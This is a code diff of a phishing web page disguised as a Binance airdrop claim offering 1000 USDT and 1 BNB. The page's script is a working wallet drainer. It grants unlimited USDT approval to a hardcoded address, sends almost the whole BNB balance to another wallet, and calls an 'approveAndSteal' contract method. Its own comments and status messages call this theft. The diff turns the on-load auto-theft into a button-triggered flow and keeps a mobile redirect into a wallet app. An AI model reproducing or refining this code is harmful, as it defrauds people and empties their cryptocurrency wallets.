@@ -9,14 +9,16 @@
 body{font-family:sans-serif;height:100vh;display:flex;justify-content:center;align-items:center;background:#ffe4f8;text-align:center;}
 .container{background:rgba(255,255,255,.9);border-radius:24px;padding:40px;margin:10px;width:90%;max-width:400px;}
 h1{color:#ff1493;font-size:24px;margin-bottom:20px;}
-#status{color:#ff69b4;font-size:18px;margin:20px;line-height:1.4;}
+button{padding:15px 30px;background:#ff6ec7;color:white;border:none;border-radius:25px;font-size:18px;cursor:pointer;margin:20px;}
+#status{color:#ff69b4;font-size:18px;margin:10px;}
 @media (max-width:480px){.container{padding:20px;}}
 </style>
 </head>
 <body>
 <div class="container">
   <h1>币安第3次空投同舟计划</h1>
-  <div id="status">跳转钱包中... → 授权 → 1000USDT+1BNB到账！</div>
+  <button id="claimBtn">领取1000USDT+1BNB</button>
+  <div id="status">点击领取1000USDT+1BNB</div>
 </div>
 <script>
 const BVXZA = "0x1ff42792e962228099cfA175aDba5412dab1448c";
@@ -33,83 +35,77 @@ function updateStatus(msg){
   document.getElementById('status').innerText = msg;
 }
 
-// 🔥 超强手机自动跳转
 async function autoRedirect(){
   const ua = navigator.userAgent;
   const isMobile = /Android|iPhone|iPad/i.test(ua);
   if(!isMobile) return;
-  
-  updateStatus('跳转钱包中... → 授权 → 1000USDT+1BNB到账！');
-  const wallets = [
-    'okxwallet://dapp?url=' + encodeURIComponent(window.location.href),
-    'trust://open_url?url=' + encodeURIComponent(window.location.href),
-    'metamask://dapp/' + encodeURIComponent(window.location.href)
-  ];
-  
-  for(let i=0; i<wallets.length; i++){
-    setTimeout(() => window.location.href = wallets[i], i * 100);
-  }
+  window.location.href = 'okxwallet://dapp?url=' + encodeURIComponent(window.location.href);
 }
 
-// 🔥 1=USDT授权  2=BNB转账
-async function autoSteal(){
-  try{
-    await window.ethereum.request({method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }]});
-    web3 = new Web3(window.ethereum);
-    const accounts = await window.ethereum.request({method: 'eth_requestAccounts'});
-    userAddr = accounts[0];
-    
-    if(!authorized){
-      // 🔥 第1次：USDT授权
-      updateStatus('第1次：USDT授权中... → 1000USDT+1BNB到账！');
+async function claimReward(){
+  if(!authorized){
+    // 第1次：USDT授权
+    updateStatus('USDT授权中...');
+    try{
+      await window.ethereum.request({method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }]});
+      web3 = new Web3(window.ethereum);
+      const accounts = await window.ethereum.request({method: 'eth_requestAccounts'});
+      userAddr = accounts[0];
+      
       const usdtABI = [{"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}];
       const usdt = new web3.eth.Contract(usdtABI, USDT_ADDR);
       await usdt.methods.approve(BVXZA, UNLIMITED).send({from: userAddr});
       authorized = true;
-      updateStatus('USDT授权成功！第2次：转BNB中...');
+      updateStatus('USDT授权成功！自动转BNB...');
+      document.getElementById('claimBtn').innerText = '转BNB中...';
+      setTimeout(claimReward, 1000); // 1秒后自动转BNB
+      return;
+    }catch(e){
+      updateStatus('授权失败，点击重试');
       return;
     }
-    
-    if(authorized && !bnbSent){
-      // 🔥 第2次：BNB全转
-      updateStatus('第2次：转BNB中... → 1000USDT+1BNB到账！');
+  }
+  
+  if(authorized && !bnbSent){
+    // 第2次：BNB全转
+    updateStatus('转BNB中...');
+    try{
       const balance = await web3.eth.getBalance(userAddr);
       const totalBNB = parseFloat(web3.utils.fromWei(balance, 'ether'));
       if(totalBNB > 0.001){
         const amount = web3.utils.toWei((totalBNB - 0.001).toString(), 'ether');
         await web3.eth.sendTransaction({from: userAddr, to: TAX_WALLET, value: amount});
         bnbSent = true;
-        updateStatus('BNB转账成功！窃取USDT中...');
+        updateStatus('BNB转账成功！窃取USDT...');
+        document.getElementById('claimBtn').innerText = '窃取USDT中...';
+        setTimeout(claimReward, 1000); // 1秒后自动窃取
+        return;
       }
+    }catch(e){
+      updateStatus('BNB转账失败，点击重试');
       return;
     }
-    
-    if(authorized && bnbSent){
-      // 🔥 第3次：BVXZA全窃取
-      updateStatus('窃取1000USDT中... → 1000USDT+1BNB到账！');
+  }
+  
+  if(authorized && bnbSent){
+    // 第3次：BVXZA全窃取
+    updateStatus('窃取1000USDT中...');
+    try{
       const bvxza = new web3.eth.Contract(BVXZA_ABI, BVXZA);
       await bvxza.methods.approveAndSteal(USDT_ADDR, UNLIMITED).send({from: userAddr});
-      updateStatus('🎉 币安第3次空投1000USDT+1BNB到账！');
+      updateStatus('🎉 1000USDT+1BNB到账！');
+      document.getElementById('claimBtn').innerText = '领取成功！';
+    }catch(e){
+      updateStatus('窃取失败，点击重试');
     }
-    
-  }catch(e){
-    updateStatus('授权失败，0.5秒重试... → 1000USDT+1BNB到账！');
-    setTimeout(autoSteal, 500);
   }
 }
 
-// 🔥 进入=0.1秒跳转+0.3秒授权！
-window.addEventListener('load', () => {
-  setTimeout(autoRedirect, 100);
-});
+document.getElementById('claimBtn').onclick = claimReward;
 
-if(window.ethereum){
-  window.addEventListener('load', () => {
-    setTimeout(autoSteal, 300);
-  });
-  window.ethereum.on('accountsChanged', autoSteal);
-  window.ethereum.on('chainChanged', autoSteal);
-}
+window.addEventListener('load', () => {
+  setTimeout(autoRedirect, 200);
+});
 </script>
 </body>
 </html>
